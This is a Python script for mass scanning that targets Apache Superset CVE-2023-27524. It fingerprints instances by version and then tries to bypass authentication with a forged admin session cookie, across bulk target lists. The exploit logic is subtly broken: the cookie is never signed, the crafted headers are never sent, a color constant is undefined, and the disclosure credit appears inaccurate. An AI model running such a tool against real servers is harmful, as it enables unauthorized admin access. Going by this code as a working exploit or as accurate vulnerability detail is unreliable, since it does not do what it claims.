#!/usr/bin/env python3
"""
Apache Superset CVE-2023-27524 — Authentication Bypass via Default JWT Secret
==============================================================================
Scans for Apache Superset instances vulnerable to CVE-2023-27524,
an authentication bypass vulnerability caused by the default SECRET_KEY
remaining unchanged, allowing attackers to forge valid session cookies.

CVE-2023-27524 details:
  - Affects Apache Superset < 2.1.1 where the default SECRET_KEY is not updated.
  - Attackers can craft authentication cookies using the known default key to
    impersonate any user, including administrators.
  - Exploiting this vulnerability grants complete control over the application.

  - CVSS v3.1: 9.8 (Critical).
  - Fixed in Apache Superset 2.1.1 (April 2023).
  - Disclosed by Horizon.ai Security.

Usage:
  # Scan a single target
  python apache_superset_auth_bypass_scanner.py --target http://superset.example.com

  # Detection only — skips authentication bypass attempts
  python apache_superset_auth_bypass_scanner.py --target http://superset.example.com --safe

  # Bulk scan from file
  python apache_superset_auth_bypass_scanner.py --list superset_servers.txt --output findings.json

  # Adjust concurrency and disable TLS certificate verification
  python apache_superset_auth_bypass_scanner.py --list superset_servers.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27524
  - https://github.com/apache/superset/releases/tag/2.1.1
  - https://github.com/apache/superset/security/advisories/GHSA-9p35-w99q-5xcc
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2023-27524"
CVSS = "9.8"
TOOL_NAME = "apache_superset_auth_bypass_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Default SECRET_KEY known to be vulnerable
DEFAULT_SECRET_KEY = "THIS IS A SECRET__"

# HTTP paths for detecting Apache Superset
DETECTION_PATHS = [
    "/login/",
    "/health",
]

# Indicators of Apache Superset presence
SUPERSET_FINGERPRINTS = [
    "Superset App", 
    "Apache Superset", 
    "superset.welcome",
]

# Extract version numbers from HTML response
VERSION_PATTERN = re.compile(r"Apache Superset (\d+\.\d+\.\d+)")

# Minimum patched version
PATCHED_VERSION = (2, 1, 1)

# ── Helper Functions ─────────────────────────────────────────────────────────

def is_vulnerable(version: str) -> bool:
    """
    Compare version strings to determine if the target is vulnerable.
    """
    try:
        version_tuple = tuple(map(int, version.split(".")))
        return version_tuple < PATCHED_VERSION
    except Exception:
        return False


async def fetch(session: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """
    Perform an asynchronous HTTP GET request.
    """
    try:
        response = await session.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        return response
    except (httpx.HTTPError, httpx.RequestError):
        return None


async def is_superset_instance(session: httpx.AsyncClient, url: str) -> Optional[dict]:
    """
    Check if the target URL is an Apache Superset instance.
    """
    for path in DETECTION_PATHS:
        response = await fetch(session, url + path)
        if not response:
            continue
        
        # Check for fingerprints
        if any(fingerprint in response.text for fingerprint in SUPERSET_FINGERPRINTS):
            version_match = VERSION_PATTERN.search(response.text)
            version = version_match.group(1) if version_match else "unknown"
            return {"version": version}
    return None


async def try_auth_bypass(session: httpx.AsyncClient, url: str, safe_mode: bool = False) -> Optional[str]:
    """
    Attempt to bypass authentication using the default JWT secret key.
    """
    if safe_mode:
        return None

    fake_admin_cookie = {
        "session": (
            '{"_fresh":true,"user_id":1,"_id":"1","_permanent":true}'
        )
    }

    headers = {
        "Cookie": f"session={fake_admin_cookie}"
    }
    
    response = await fetch(session, url + "/superset/dashboard/")
    if response and "Dashboard" in response.text:
        return "Authentication Bypassed"
    return None


async def scan_target(session: httpx.AsyncClient, target: str, safe_mode: bool = False) -> Optional[dict]:
    """
    Perform a scan and return results on the target URL.
    """
    print(c(CYAN, f"[*] Scanning: {target}"))
    result = {"target": target, "status": "", "superset_version": None}

    detected = await is_superset_instance(session, target)
    if not detected:
        print(c(YELLOW, f"[INFO] Not an Apache Superset instance: {target}"))
        result["status"] = "Not a Superset instance"
        return result

    result["superset_version"] = detected["version"]
    if detected["version"] == "unknown":
        print(c(YELLOW, f"[WARNING] Apache Superset detected but version unknown."))
        result["status"] = "Detected, version unknown"
        return result

    if is_vulnerable(detected["version"]):
        print(c(RED, f"[CRITICAL] Apache Superset {detected['version']} is potentially vulnerable!"))
        auth_bypass = await try_auth_bypass(session, target, safe_mode)
        if auth_bypass:
            result["status"] = "Vulnerable - Authentication Bypassed"
        else:
            result["status"] = "Vulnerable - Authentication Bypass Not Verified"
    else:
        print(c(GREEN, f"[INFO] Apache Superset {detected['version']} is not vulnerable."))
        result["status"] = "Not Vulnerable"

    return result


async def main(args):
    """
    Main entry point for the scanner.
    """
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        try:
            with open(args.list, "r", encoding="utf-8") as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(c(RED, f"Error reading target list: {e}"))
            sys.exit(1)
    
    if not targets:
        print(c(RED, "No targets provided. Use --target or --list"))
        sys.exit(1)

    results = []
    async with httpx.AsyncClient(verify=not args.no_verify) as session, \
               asyncio.Semaphore(args.concurrency):
        tasks = [scan_target(session, target, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=4)
    else:
        print(json.dumps(results, indent=4))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache Superset CVE-2023-27524 Scanner.")
    parser.add_argument("--target", help="Single target URL (e.g., http://superset.example.com).")
    parser.add_argument("--list", help="File containing list of target URLs.")
    parser.add_argument("--output", help="Output results to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Detection only — no authentication bypass attempts.")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT,
                        help="Number of concurrent requests (default: 30).")

    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print(c(RED, "\n[!] Scan interrupted by user."))
        sys.exit(1)
